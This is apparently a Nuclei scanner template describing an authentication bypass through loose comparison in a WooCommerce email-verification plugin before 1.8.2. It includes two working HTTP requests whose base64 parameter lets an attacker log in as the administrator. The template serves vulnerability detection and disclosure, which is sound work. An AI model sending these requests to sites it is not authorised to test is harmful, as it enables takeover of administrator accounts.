# Nuclei Template: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
**Template ID:** wp-woocommerce-email-verification
**Vulnerability Class:** Authentication Bypass Using an Alternate Path or Channel
**Severity:** Critical
**CWE:** CWE-288
**Source:** Nuclei Template (`wp-woocommerce-email-verification.yaml`)

## Vulnerability Information & PoC

## Description
Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
GET {{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
```

## References
- https://wpvulndb.com/vulnerabilities/10318
- https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8
